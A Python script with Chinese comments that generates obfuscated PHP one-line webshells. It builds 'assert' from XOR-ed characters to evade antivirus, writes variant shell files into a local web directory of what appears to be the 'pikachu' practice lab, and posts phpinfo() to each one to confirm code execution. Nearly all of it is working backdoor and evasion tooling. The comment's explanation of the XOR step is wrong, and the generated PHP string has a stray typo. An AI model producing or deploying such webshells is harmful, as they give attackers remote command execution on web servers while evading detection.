#-- coding: utf-8 --
#@Author : Schun
#@Time : 2022/8/2 17:39

import requests
import queue
import threading


"""
设计原理：通过异或运算出的字符拼接成可执行的函数，达到免杀,这只是一个启蒙思路。
Tips:php7.1之后assert()也不能用
一句话木马：<?php $a=('!'^'@').'ssert';$a($_POST[x]);?>      
解释说明： '!'^'@'可以看表！为33而@为64，转换原理是把33与64分别换成二进制，然后相加在转换成字符就是a，和后面代码拼接就可以成为assert。
"""

def check():
    while not q.empty():
        filename = q.get()
        uri = 'http://www.pikachu.com/tmp/' + filename
        data = {
            "x": "phpinfo();"
        }
        rs = requests.post(url=uri, data=data).content.decode("utf-8")
        if "phpinfo" in rs:
            print("{}|ok".format(uri))
        else:
            print("{}|no".format(uri))


if __name__ == '__main__':
    q = queue.Queue()
    for i in range(32,34):
        for j in range(63,65):
            payload = "'" + chr(i) + "'" + '^' + "'" + chr(j) + "'"
            code = "<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?);?>"
            filename = str(i) + "nnn" + str(j) + ".php"
            q.put(filename)
            with open("D:/phpstudy_pro/WWW/pikachu/tmp/" + filename,"w") as f:
                    f.write(code)
    for x in range(10):
        t = threading.Thread(target=check)
        t.start()